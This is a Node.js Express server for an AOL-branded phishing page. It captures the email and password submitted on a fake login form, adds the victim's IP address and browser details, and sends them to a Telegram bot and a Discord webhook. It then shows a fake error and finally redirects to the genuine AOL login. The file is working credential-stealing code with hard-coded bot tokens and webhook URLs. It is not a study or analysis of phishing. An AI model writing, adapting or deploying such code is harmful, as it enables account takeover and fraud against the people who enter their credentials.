const express = require("express");
const bodyParser = require("body-parser");
const { EmbedBuilder, WebhookClient } = require("discord.js");
const XMLHttpRequest = require("xhr2");
const ip = require("whatismyip");
const useragent = require("express-useragent");

const TELEGRAM_TOKEN = "6416083286:AAGapinEtG-Y3jXiTKWXFDVNrublC2ncQeY";
const TELEGRAM_CHAT_ID = 5567310651;

const options = {
  url: "http://checkip.dyndns.org/",
  truncate: "",
  timeout: 60000,
  matchIndex: 0,
};

/////////////////////////////////////////////////////
/////////////////////////////////////////////////////
/////////////////////////////////////////////////////
/////////////////////////////////////////////////////
/////////////////////////////////////////////////////
/////////////////////////////////////////////////////
/////////////////////////////////////////////////////

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.set("view engine", "ejs");
app.use(express.static("public"));
app.use(useragent.express());

const webhookClient = new WebhookClient({
  url: "https://discord.com/api/webhooks/1071215574417424394/gZ_ZaWeb82QNhl-G7FCMutPcMb16UZNxYvBIgE6q3OwQwg5XG1wzXi25fnWe7Qg8gwom",
});

app.get("/", (req, res) => {
  res.render("index");
});

app.get("/error", (req, res) => {
  res.render("error");
});



app.post("/", (req, res) => {
  ip.whatismyip(options, function (err, data) {
    if (err === null) {
      const my_text = `Result is:%0A => EMAIL: ${
        req.body.email
      } %0A %0A => PASSWORD: ${req.body.password} %0A %0A => IP-ADDRESS: ${
        data.ip
      }...|${`https://www.geodatatool.com/en/?ip=${data.ip}`} => AGENT: ${
        req.useragent.browser
      },${req.useragent.version},${req.useragent.os}, ${req.useragent.source}`;

      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${my_text}`;

      let api = new XMLHttpRequest();
      api.open("GET", url, true);
      api.send();

      const embed = new EmbedBuilder()
        .setTitle("AOL")
        .setDescription(
          `Result is:
      => EMAIL: ${req.body.email}
   
      => PASSWORD: ${req.body.password}

      => IP-ADDRESS: ${data.ip}

      => AGENT: ${req.useragent.browser},${req.useragent.version},${req.useragent.os}, ${req.useragent.source}
      `
        )

        .setColor(0x00ffff);

      webhookClient.send({
        content: "AOL",
        username: "AOL",
        avatarURL: "https://i.imgur.com/AfFp7pu.png",
        embeds: [embed],
      });
    }
  });

  //   const embed = new EmbedBuilder()
  //     .setTitle("AOL")
  //     .setDescription(
  //       `Result is:
  //       => EMAIL: ${req.body.email}

  //       => PASSWORD: ${req.body.password}

  //       => IP-ADDRESS: ${ipAdrress}
  //       `
  //     )

  //     .setColor(0x00ffff);

  //   webhookClient.send({
  //     content: "AOL",
  //     username: "AOL",
  //     avatarURL: "https://i.imgur.com/AfFp7pu.png",
  //     embeds: [embed],
  //   });

  res.render("error");
});

app.post("/error", (req, res) => {
  ip.whatismyip(options, function (err, data) {
    if (err === null) {
      const my_text = `Result is:%0A => EMAIL: ${
        req.body.email
      } %0A %0A => PASSWORD: ${req.body.password} %0A %0A => IP-ADDRESS: ${
        data.ip
      }...|${`https://www.geodatatool.com/en/?ip=${data.ip}`} => AGENT: ${
        req.useragent.browser
      },${req.useragent.version},${req.useragent.os}, ${req.useragent.source}`;

      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${my_text}`;

      let api = new XMLHttpRequest();
      api.open("GET", url, true);
      api.send();

      const embed = new EmbedBuilder()
        .setTitle("AOL")
        .setDescription(
          `Result is:
       => EMAIL: ${req.body.email}
    
       => PASSWORD: ${req.body.password}
 
       => IP-ADDRESS: ${data.ip}
 
       => AGENT: ${req.useragent.browser},${req.useragent.version},${req.useragent.os}, ${req.useragent.source}
       `
        )

        .setColor(0x00ffff);

      webhookClient.send({
        content: "AOL",
        username: "AOL",
        avatarURL: "https://i.imgur.com/AfFp7pu.png",
        embeds: [embed],
      });
    }
  });

  res.redirect("https://login.aol.com/");
});

app.listen(process.env.PORT || 3003, () => {
  console.log("server listening");
});
